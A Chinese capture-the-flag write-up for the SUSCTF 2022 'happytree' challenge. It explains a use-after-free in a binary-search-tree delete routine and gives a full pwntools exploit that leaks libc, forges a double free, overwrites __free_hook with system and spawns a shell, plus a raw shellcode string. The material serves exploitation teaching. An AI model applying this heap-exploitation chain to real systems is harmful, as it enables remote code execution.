
# [原创]2022susctf的happytree详细题解

关键词：2.27-1.2，二叉排序树，double free

## 程序描述

### `add()`

![](https://bbs.kanxue.com/upload/attach/202203/947540_DAT6U6V2DGCDNT6.jpg)

通过对于 `add()` 函数的分析，我画出了它的结构体，如下：

![](https://bbs.kanxue.com/upload/attach/202203/947540_QPKNC393QYWX7KQ.jpg)

### `delete()`

![](https://bbs.kanxue.com/upload/attach/202203/947540_Z3NACXGS89SGRCM.jpg)

可以看出 `free()` 掉堆块后，并没有置零指针，所以存在 UAF 漏洞，可以利用此漏洞来 double free。

## 漏洞利用

### 前置知识

二叉排序树中，删除某一结点有两种方法：

1. 用此结点的前驱结点相互置换。
2. 用此结点的后驱结点相互置换。

![](https://bbs.kanxue.com/upload/attach/202203/947540_EA9BVVCGQZKPVY6.jpg)

![](https://bbs.kanxue.com/upload/attach/202203/947540_62VZ2YW5BDHH9ZJ.jpg)

从 `delete()` 函数中的 `sub_f72()` 函数中可以得出。程序是找到第一个右叉树的左边到底的结点，也就是后驱结点，从而进行内容交换，然后释放结点的（这部分后面会有详细解释）。

---

### 1. 首先进行 libc 地址的泄露

我们先申请 8 个 chunk，然后释放掉。再申请出来后，`show()` 出最后一个 chunk，即可泄露出来 libc 地址。

```
for i in range(8):
  add(0x80+i,b'a')

add(0x90,b'a')

for i in range(8):
  free(0x80+i)

for i in range(7):
  add(0x87-i,b'a')

add(0x80,b'a'*8)

show(0x80)

libcbase = u64(ru('\x7f')[-6:].ljust(8,b'\x00')) - 96 - 0x10 - libc.sym['__malloc_hook']
li('libcbase',libcbase)
free_hook = libcbase + libc.sym['__free_hook']
system_addr = libcbase + libc.sym['system']
```

注意一点就是释放堆块后，再次申请时，需要从大到小申请。因为从小到大申请时，程序会进入到第一个 `if` 语句当中，因为我们从小到大申请的，所以 `a2` 的右子树有地址。但是由于 `a2` 的右子树的堆块已经释放掉了，所以程序会报错。从大到小申请时，`a2` 的左子树是空的，所以就会跳到第一个 `else`，执行申请新堆块的操作。

![](https://bbs.kanxue.com/upload/attach/202203/947540_7W9M77FAG95PK8A.jpg)

### 2. 利用二叉排序树的删除特性和指针没有置零，来进行 double free 的构造

改 `free_hook` 进行 get shell。

首先构造二叉树：

```
add(1,b'a')  # 为什么创造1和2大小的堆块后面会分析

add(2,b'a')

add(8,b'/bin/sh')

add(0xf0,b'a')

add(0xf4,b'a')

add(0xf3,b'a')

add(0xf1,b'a')

add(0xf2,b'a')

add(0xe9,b'a')
```

![](https://bbs.kanxue.com/upload/attach/202203/947540_ASADBSH8XPV3SQC.jpg)

释放 `0xf2` 后，释放 `0xf5` 时，因为它的右子树是 `0xf2` 而且它只有右子树。所以它将自身堆块释放，将 `0xf4` 的右子树变成了 `0xf2`。之后我们会释放 `0xf4`，虽然 `0xf2` 被释放了，但是由于 `0xf4` 的左右指针都在。所以它作为一个拥有左右子树的父亲结点，会和后驱结点（`0xf2`）交换内容，并且释放掉 `0xf2`。这样就会造成 double free。

```
free(0xf2)
free(0xf5)
free(0xf4)
free(1)
free(2)
debug()

add(0xef,p64(free_hook))  #尽量用从大到小来申请，因为add函数申请时，当申请的堆块小于上次申请的堆块大小时，会直接申请。
add(0xee,p64(0))
add(0xed,p64(0))
add(0xec,p64(system_addr))
free(8)
shell()
```

## wp

```
from pwn import *

context.log_level = 'debug'

# context.arch = 'amd64'

libc = ELF('./libc-2.27.so')

file = './happytree'

elf = ELF(file)

shellcode = asm(shellcraft.sh())

shellcode_32 = b'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' #--21Bytes 32位



local = 1

if local:

  io = process(file)

else:

  io = remote('node4.buuoj.cn',25727)



def debug():

  gdb.attach(io)





r = lambda : io.recv()

rx = lambda x: io.recv(x)

ru = lambda x: io.recvuntil(x)

rud = lambda x: io.recvuntil(x, drop=True)

s = lambda x: io.send(x)

sl = lambda x: io.sendline(x)

sa = lambda x, y: io.sendafter(x, y)

sla = lambda x, y: io.sendlineafter(x, y)

li = lambda name,x : log.info(name+':'+hex(x))

shell = lambda : io.interactive()



def add(size,content):

  ru('cmd> ')

  sl('1')

  ru('data: ')

  sl(str(size))

  ru('content: ')

  s(content)



def free(size):

  ru('cmd> ')

  sl('2')

  ru('data: ')

  sl(str(size))



def show(size):

  ru('cmd> ')

  sl('3')

  ru('data: ')

  sl(str(size))



for i in range(8):

  add(0x80+i,b'a')



add(0x90,b'a')



for i in range(8):

  free(0x80+i)





for i in range(7):

  add(0x87-i,b'a')

add(0x80,b'a'*8)

show(0x80)

libcbase = u64(ru('\x7f')[-6:].ljust(8,b'\x00')) - 96 - 0x10 - libc.sym['__malloc_hook']
li('libcbase',libcbase)
free_hook = libcbase + libc.sym['__free_hook']
system_addr = libcbase + libc.sym['system']



add(1,b'a')
add(2,b'a')
add(8,b'/bin/sh')
add(0xf0,b'a')
add(0xf4,b'a')
add(0xf3,b'a')
add(0xf1,b'a')
add(0xf2,b'a')
add(0xe9,b'a')
free(0xf0)
add(0xf5,b'a')
free(0xf2)
free(0xf5)
free(0xf4)
free(1)
free(2)
debug()
add(0xef,p64(free_hook))
add(0xee,p64(0))
add(0xed,p64(0))
add(0xec,p64(system_addr))
free(8)
shell()
```

## 反思

![](https://bbs.kanxue.com/upload/attach/202203/947540_6FV2TBNNCWXAA62.jpg)

（一开始构造错误的二叉树）

笔者一开始看 wp 复现时，构造的二叉树为上图。经过了一番苦思冥想和数小时调试（其实就是太菜了），才明白这样构造的不对的地方：

1. 这样将 `0xf0` 释放时，因为 `0xf0` 没有左子树，所以会直接释放掉 `0xf0`，并不会和 `0xf2` 交换内容且释放 `0xf2`。
2. 我们必须让 `0xf4` 的左子树有两层，必须像下面这样。否则如果像我一开始构造的那样的话，释放掉 `0xf0` 后，再释放 `0xf3`，此时 `0xf4` 就只有右子树，没有左子树了。所以释放 `0xf4` 时，就只会释放本身的堆块，并不会释放右子树的堆块，不能造成 double free。

![](https://bbs.kanxue.com/upload/attach/202203/947540_RS6H2R3CTU9NNHE.jpg)

![](https://bbs.kanxue.com/upload/attach/202203/947540_XH2XG3DXZQX2BSP.jpg)

最后至于为什么像我第一次错误构造时，释放掉 `0xf3` 时，会将父节点的左子树指针清零，而正确构造时所有指针并没有清零，希望读者们可以自行查一查二叉排序树的相关知识和源码学习。

最后的最后，笔者能力有限，若有错误的地方，欢迎私聊或评论交流。

愿我们都能保持初心，砥砺前行。

--Nirvana

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2022-4-17 21:44 被 Nirvana. 编辑，原因：

上传的附件：
- `happytree`（9.98kb，5次下载）
